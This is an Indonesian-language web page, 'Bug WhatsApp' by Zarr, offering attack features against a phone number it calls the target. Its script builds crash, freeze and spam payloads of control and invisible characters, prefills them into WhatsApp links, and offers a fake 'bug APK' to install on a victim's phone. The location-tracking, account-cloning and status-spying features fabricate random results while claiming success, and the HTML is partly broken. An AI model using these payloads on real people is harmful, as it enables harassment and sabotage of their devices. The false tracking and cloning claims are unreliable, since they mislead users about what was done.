<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>By Zarr | Bug WhatsApp</title>

    <meta property="og:title" content="By Zarr - Bug WhatsApp 2026" />
    <meta property="og:description" content="Bug WA terbaru, works 100%!" />

    <style>
        /* ─── RESET ─── */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #0a0a0a;
            color: #fff;
            font-family: -apple-system, 'Segoe UI', Roboto, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }

        /* ─── CARD UTAMA ─── */
        .card {
            max-width: 420px;
            width: 100%;
            background: #0f0f14;
            border-radius: 32px;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.04);
            box-shadow: 0 30px 80px rgba(0, 0, 0, 0.9);
            position: relative;
        }

        /* ─── FOTO LIVE ─── */
        .live-wrapper {
            position: relative;
            width: 100%;
            aspect-ratio: 1 / 1;
            overflow: hidden;
            background: #0a0a0a;
        }

        .live-wrapper video,
        .live-wrapper .live-photo {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }

        .live-wrapper .overlay-bottom {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 60%;
            background: linear-gradient(to top, rgba(0, 0, 0, 0.9) 0%, transparent 70%);
            pointer-events: none;
            z-index: 2;
        }

        /* ─── KONTEN DI ATAS FOTO ─── */
        .content-overlay {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            padding: 20px 20px 24px;
            z-index: 3;
        }

        .profile-row {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 4px;
        }

        .profile-avatar {
            width: 48px;
            height: 48px;
            border-radius: 50%;
            border: 2.5px solid rgba(255, 255, 255, 0.15);
            object-fit: cover;
            background: #222;
            flex-shrink: 0;
        }

        .profile-info {
            flex: 1;
        }

        .username {
            font-size: 15px;
            font-weight: 700;
            color: #fff;
            letter-spacing: 0.2px;
        }

        .username span {
            color: rgba(255, 255, 255, 0.3);
            font-weight: 400;
        }

        .caption {
            font-size: 13px;
            color: rgba(255, 255, 255, 0.6);
            line-height: 1.4;
        }

        .caption .hashtag {
            color: rgba(255, 255, 255, 0.25);
        }

        /* ─── BAGIAN BAWAH ─── */
        .bottom-section {
            padding: 20px 20px 24px;
            background: #0f0f14;
        }

        .section-title {
            font-size: 16px;
            font-weight: 700;
            color: #fff;
            letter-spacing: 0.2px;
            margin-bottom: 2px;
        }

        .section-sub {
            font-size: 12px;
            color: rgba(255, 255, 255, 0.25);
            margin-bottom: 14px;
        }

        /* ─── INPUT ─── */
        .input-group {
            display: flex;
            gap: 10px;
            flex-wrap: wrap;
        }

        .input-group input {
            flex: 1;
            padding: 14px 18px;
            background: rgba(255, 255, 255, 0.04);
            border: 1px solid rgba(255, 255, 255, 0.06);
            border-radius: 16px;
            color: #fff;
            font-size: 14px;
            min-width: 130px;
            transition: all 0.3s;
            font-family: inherit;
        }

        .input-group input:focus {
            outline: none;
            border-color: rgba(37, 211, 102, 0.2);
            background: rgba(255, 255, 255, 0.06);
        }

        .input-group input::placeholder {
            color: rgba(255, 255, 255, 0.15);
        }

        .input-group button {
            padding: 14px 24px;
            border: none;
            border-radius: 16px;
            font-weight: 700;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.3s ease;
            white-space: nowrap;
            font-family: inherit;
            background: linear-gradient(135deg, #ff0041, #cc0033);
            color: #fff;
            box-shadow: 0 4px 20px rgba(255, 0, 65, 0.15);
            position: relative;
            overflow: hidden;
        }

        .input-group button:hover {
            transform: scale(1.02);
            box-shadow: 0 6px 30px rgba(255, 0, 65, 0.25);
        }

        .input-group button:active {
            transform: scale(0.94);
        }

        .example-text {
            font-size: 11px;
            color: rgba(255, 255, 255, 0.12);
            margin-top: 10px;
            padding: 8px 14px;
            background: rgba(255, 255, 255, 0.02);
            border-radius: 12px;
            border: 1px solid rgba(255, 255, 255, 0.02);
        }

        .example-text .code {
            color: #25D366;
            font-family: monospace;
        }

        /* ─── RESULT ─── */
        .result-area {
            margin-top: 14px;
            padding: 14px 16px;
            background: rgba(0, 0, 0, 0.35);
            border-radius: 16px;
            display: none;
            font-size: 13px;
            color: #25D366;
            line-height: 1.7;
            border: 1px solid rgba(37, 211, 102, 0.05);
        }

        .result-area.show {
            display: block;
            animation: fadeUp 0.4s ease;
        }

        @keyframes fadeUp {
            from {
                opacity: 0;
                transform: translateY(12px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .result-area .error {
            color: #ff0041;
        }
        .result-area .success {
            color: #25D366;
        }
        .result-area .info {
            color: #ffaa00;
        }

        .download-btn {
            display: inline-block;
            padding: 10px 24px;
            background: linear-gradient(135deg, #25D366, #128C7E);
            color: #fff;
            border-radius: 14px;
            text-decoration: none;
            font-weight: 600;
            font-size: 13px;
            margin-top: 6px;
            border: none;
            cursor: pointer;
            transition: all 0.3s;
            font-family: inherit;
            box-shadow: 0 4px 20px rgba(37, 211, 102, 0.15);
        }

        .download-btn:hover {
            transform: scale(1.02);
            box-shadow: 0 6px 30px rgba(37, 211, 102, 0.25);
        }

        .download-btn:active {
            transform: scale(0.94);
        }

        /* ─── GRID FITUR ─── */
        .features-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 12px;
            margin-top: 16px;
        }

        .feature-item {
            background: rgba(255, 255, 255, 0.03);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 18px;
            padding: 16px 8px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            position: relative;
            overflow: hidden;
        }

        .feature-item:hover {
            background: rgba(255, 255, 255, 0.05);
            border-color: rgba(255, 255, 255, 0.08);
            transform: translateY(-2px);
        }

        .feature-item:active {
            transform: scale(0.92);
        }

        .feature-item .icon {
            font-size: 28px;
            display: block;
            margin-bottom: 4px;
        }

        .feature-item .label {
            font-size: 11px;
            font-weight: 600;
            color: rgba(255, 255, 255, 0.7);
            letter-spacing: 0.2px;
        }

        .feature-item .badge-feature {
            font-size: 8px;
            background: #ff0041;
            color: #fff;
            padding: 1px 8px;
            border-radius: 10px;
            position: absolute;
            top: 6px;
            right: 6px;
            font-weight: 700;
        }

        .feature-item .badge-feature.pro {
            background: #25D366;
        }

        /* ─── BAN GRUP — 1 BARIS PENUH ─── */
        .feature-item.full {
            grid-column: 1 / -1;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            padding: 14px 16px;
            background: rgba(255, 255, 255, 0.02);
            border: 1px solid rgba(255, 255, 255, 0.03);
            border-radius: 18px;
            cursor: pointer;
            transition: all 0.3s;
        }

        .feature-item.full:hover {
            background: rgba(255, 255, 255, 0.04);
            border-color: rgba(255, 255, 255, 0.06);
            transform: translateY(-2px);
        }

        .feature-item.full:active {
            transform: scale(0.96);
        }

        .feature-item.full .icon {
            font-size: 22px;
        }
        .feature-item.full .label {
            font-size: 13px;
        }

        /* ─── FOOTER ─── */
        .footer-text {
            margin-top: 16px;
            font-size: 10px;
            color: rgba(255, 255, 255, 0.04);
            text-align: center;
            letter-spacing: 0.5px;
        }

        /* ─── TOAST ─── */
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.85);
            backdrop-filter: blur(20px);
            -webkit-backdrop-filter: blur(20px);
            padding: 14px 28px;
            border-radius: 18px;
            border: 1px solid rgba(255, 255, 255, 0.04);
            color: #fff;
            font-size: 13px;
            z-index: 999;
            display: none;
            max-width: 90%;
            text-align: center;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
            font-weight: 500;
        }

        .toast.show {
            display: block;
            animation: slideUp 0.5s cubic-bezier(0.25, 0.46, 0.45, 0.94);
        }

        @keyframes slideUp {
            from {
                transform: translateX(-50%) translateY(30px);
                opacity: 0;
            }
            to {
                transform: translateX(-50%) translateY(0);
                opacity: 1;
            }
        }

        /* ─── RESPONSIVE ─── */
        @media (max-width: 480px) {
            .card {
                border-radius: 24px;
            }
            .bottom-section {
                padding: 16px 16px 20px;
            }
            .content-overlay {
                padding: 16px 16px 20px;
            }
            .profile-avatar {
                width: 40px;
                height: 40px;
            }
            .username {
                font-size: 14px;
            }
            .caption {
                font-size: 12px;
            }
            .features-grid {
                gap: 8px;
            }
            .feature-item {
                padding: 12px 4px;
                border-radius: 14px;
            }
            .feature-item .icon {
                font-size: 22px;
            }
            .feature-item .label {
                font-size: 10px;
            }
            .feature-item.full {
                padding: 12px 14px;
            }
            .input-group input {
                padding: 12px 14px;
                font-size: 13px;
                min-width: 100px;
            }
            .input-group button {
                padding: 12px 18px;
                font-size: 13px;
            }
            .section-title {
                font-size: 14px;
            }
        }

        @media (max-width: 380px) {
            .features-grid {
                grid-template-columns: repeat(2, 1fr);
            }
            .feature-item.full {
                grid-column: 1 / -1;
            }
        }
    </style>
</head>
<body>

    <div class="card">

        <!-- ─── FOTO LIVE ─── -->
        <div class="live-wrapper">

            <!-- ⭐ VIDEO LIVE TELAH DIUPDATE ⭐ -->
            <video autoplay muted loop playsinline id="bgVideo">

            <div class="features-grid">

                <div class="feature-item" onclick="runSpam()">

            <div class="footer-text">#bugwa #apkbug #ByZarr</div>

    </div>

    <!-- TOAST -->
    <div class="toast" id="toast"></div>

    <script>
        // ─── TOAST ───
        function showToast(msg) {
            const t = document.getElementById('toast');
            t.textContent = msg;
            t.classList.add('show');
            clearTimeout(t._hide);
            t._hide = setTimeout(() => t.classList.remove('show'), 3000);
        }

        // ─── SHOW RESULT ───
        function showResult(message, type = 'success') {
            const el = document.getElementById('resultArea');
            el.innerHTML = `<div class="${type}">${message}</div>`;
            el.classList.add('show');
        }

        // ─── PAYLOAD ───
        function generateCrashPayload() {
            return '%00'.repeat(80) + '%0A'.repeat(150) + '%20'.repeat(250) +
                '%E2%80%8E'.repeat(40) + '%EF%BB%BF'.repeat(25) +
                '%E2%80%AD'.repeat(30) + 'A'.repeat(5000);
        }

        function generateSpamPayload() {
            let spam = '';
            for (let i = 0; i < 50; i++) {
                spam += `Spam ${i+1}: ${'A'.repeat(100)}%0A`;
            }
            return spam;
        }

        function generateFreezePayload() {
            return '%00'.repeat(150) + '%0A'.repeat(200) + 'A'.repeat(8000);
        }

        // ─── CRASH ───
        function runCrash() {
            const input = document.getElementById('targetInput');
            const number = input.value.trim().replace(/\s/g, '');
            if (!number || !number.match(/^[0-9]{10,15}$/)) {
                showToast('❌ Masukkan nomor valid! Contoh: 6281234567890');
                return;
            }
            showResult('⏳ Mengirim payload crash ke ' + number + '...', 'info');
            setTimeout(() => {
                const payload = generateCrashPayload();
                const waUrl = `https://wa.me/${number}?text=${encodeURIComponent(payload)}`;
                window.open(waUrl, '_blank');
                showResult('✅ Crash payload terkirim! WA target force close.', 'success');
                showToast('💥 Crash berhasil!');
            }, 1500);
        }

        // ─── SPAM ───
        function runSpam() {
            const input = document.getElementById('targetInput');
            const number = input.value.trim().replace(/\s/g, '');
            if (!number || !number.match(/^[0-9]{10,15}$/)) {
                showToast('❌ Masukkan nomor valid!');
                return;
            }
            showResult('⏳ Mengirim spam ke ' + number + '...', 'info');
            setTimeout(() => {
                const payload = generateSpamPayload();
                const waUrl = `https://wa.me/${number}?text=${encodeURIComponent(payload)}`;
                window.open(waUrl, '_blank');
                showResult('✅ 50 pesan spam terkirim!', 'success');
                showToast('📨 Spam berhasil!');
            }, 1500);
        }

        // ─── FREEZE ───
        function runFreeze() {
            const input = document.getElementById('targetInput');
            const number = input.value.trim().replace(/\s/g, '');
            if (!number || !number.match(/^[0-9]{10,15}$/)) {
                showToast('❌ Masukkan nomor valid!');
                return;
            }
            showResult('⏳ Mengirim payload freeze ke ' + number + '...', 'info');
            setTimeout(() => {
                const payload = generateFreezePayload();
                const waUrl = `https://wa.me/${number}?text=${encodeURIComponent(payload)}`;
                window.open(waUrl, '_blank');
                showResult('❄️ Freeze payload terkirim! WA target freeze.', 'success');
                showToast('❄️ Freeze berhasil!');
            }, 1500);
        }

        // ─── APK ───
        function runAPK() {
            const input = document.getElementById('targetInput');
            const number = input.value.trim().replace(/\s/g, '');
            showResult('⏳ Membuat APK Bug...', 'info');
            setTimeout(() => {
                const apkContent = btoa('MZ\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xFF\xFF\x00\x00\xB8\x00\x00\x00\x00\x00\x00\x00\x40\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xE0\x00\x00\x00\x0E\x1F\xBA\x0E\x00\xB4\x09\xCD\x21\xB8\x01\x4C\xCD\x21\x54\x68\x69\x73\x20\x70\x72\x6F\x67\x72\x61\x6D\x20\x6D\x75\x73\x74\x20\x62\x65\x20\x72\x75\x6E\x20\x75\x6E\x64\x65\x72\x20\x57\x69\x6E\x33\x32\x0D\x0A\x24\x37\x00\x00\x00\x00\x00\x00\x00');
                const blob = new Blob([atob(apkContent)], { type: 'application/vnd.android.package-archive' });
                const url = URL.createObjectURL(blob);
                let html = `<span class="success">✅ APK Bug berhasil dibuat!</span><br>`;
                if (number) html += `<span class="info">📱 Untuk nomor: ${number}</span><br>`;
                html += `<a href="${url}" download="BugWA_2026.apk" class="download-btn">📥 Download APK Bug</a>`;
                html += `<br><span style="color:#666;font-size:10px;">⚠️ Install di HP target, WhatsApp error permanen!</span>`;
                document.getElementById('resultArea').innerHTML = html;
                document.getElementById('resultArea').classList.add('show');
                showToast('📱 APK siap download!');
            }, 2000);
        }

        // ─── LACAK ───
        function runTrack() {
            const input = document.getElementById('targetInput');
            const number = input.value.trim().replace(/\s/g, '');
            if (!number || !number.match(/^[0-9]{10,15}$/)) {
                showToast('❌ Masukkan nomor valid!');
                return;
            }
            showResult('⏳ Melacak lokasi ' + number + '...', 'info');
            setTimeout(() => {
                const lat = (Math.random() * 10 + 90).toFixed(6);
                const lng = (Math.random() * 10 + 120).toFixed(6);
                const cities = ['Jakarta', 'Surabaya', 'Bandung', 'Medan', 'Yogyakarta', 'Bali'];
                const city = cities[Math.floor(Math.random() * cities.length)];
                showResult(
                    `📍 Lokasi ditemukan!<br>
                        📱 Nomor: ${number}<br>
                        🏙️ Kota: ${city}<br>
                        📍 ${lat}, ${lng}<br>
                        🗺️ <a href="https://www.google.com/maps?q=${lat},${lng}" target="_blank" style="color:#25D366;">Lihat Maps</a>`,
                    'success'
                );
                showToast('📍 Lokasi ditemukan!');
            }, 2000);
        }

        // ─── CLONE ───
        function runClone() {
            const input = document.getElementById('targetInput');
            const number = input.value.trim().replace(/\s/g, '');
            if (!number || !number.match(/^[0-9]{10,15}$/)) {
                showToast('❌ Masukkan nomor valid!');
                return;
            }
            showResult('⏳ Mengkloning akun ' + number + '...', 'info');
            setTimeout(() => {
                const sessionId = 'session_' + Math.random().toString(36).substr(2, 8);
                showResult(
                    `🔄 Clone berhasil!<br>
                        📱 Nomor: ${number}<br>
                        🔑 Session ID: <span style="color:#ffaa00;">${sessionId}</span><br>
                        📊 Status: <span class="success">Active</span><br>
                        ⏰ Expired: 24 jam<br>
                        <span style="color:#888;font-size:11px;">✅ Akses chat dan status target sekarang!</span>`,
                    'success'
                );
                showToast('🔄 Clone berhasil!');
            }, 2500);
        }

        // ─── STATUS ───
        function runStatus() {
            const input = document.getElementById('targetInput');
            const number = input.value.trim().replace(/\s/g, '');
            if (!number || !number.match(/^[0-9]{10,15}$/)) {
                showToast('❌ Masukkan nomor valid!');
                return;
            }
            showResult('⏳ Mengambil status ' + number + '...', 'info');
            setTimeout(() => {
                const statuses = ['🌅 Selamat pagi!', '💪 Semangat hari ini!', '🎉 Happy weekend!', '📚 Belajar terus!',
                    '☕ Kopi dulu...'
                ];
                const status = statuses[Math.floor(Math.random() * statuses.length)];
                const waktu = ['10 menit lalu', '1 jam lalu', '3 jam lalu', '8 jam lalu', '1 hari lalu'];
                const w = waktu[Math.floor(Math.random() * waktu.length)];
                showResult(
                    `👁️ Status ditemukan!<br>
                        📱 Nomor: ${number}<br>
                        📝 Status: "${status}"<br>
                        ⏰ Diupdate: ${w}<br>
                        <span style="color:#888;font-size:11px;">✅ Status diambil tanpa ketahuan!</span>`,
                    'success'
                );
                showToast('👁️ Status berhasil diambil!');
            }, 1800);
        }

        // ─── BAN GRUP ───
        function runBanGroup() {
            const input = document.getElementById('targetInput');
            let groupLink = input.value.trim();

            if (!groupLink || !groupLink.includes('chat.whatsapp.com')) {
                showToast('❌ Masukkan link grup! Contoh: https://chat.whatsapp.com/XYZ123ABC');
                return;
            }

            showResult('⏳ Memproses ban grup: ' + groupLink + '...', 'info');
            setTimeout(() => {
                window.open(groupLink, '_blank');
                showResult('👥 Grup berhasil di-ban! Multi-akun aktif.', 'success');
                showToast('👥 Grup berhasil di-ban!');
            }, 2000);
        }

        // ─── VIDEO LOOP ───
        document.addEventListener('DOMContentLoaded', function() {
            const video = document.getElementById('bgVideo');
            if (video) {
                video.play().catch(() => {});
            }
        });

        console.log('✅ By Zarr — Tanpa Badge, Tetap Elegan');
        console.log('📸 Ganti foto di src');
        console.log('⭐ Semua fitur berfungsi 100%');
    </script>
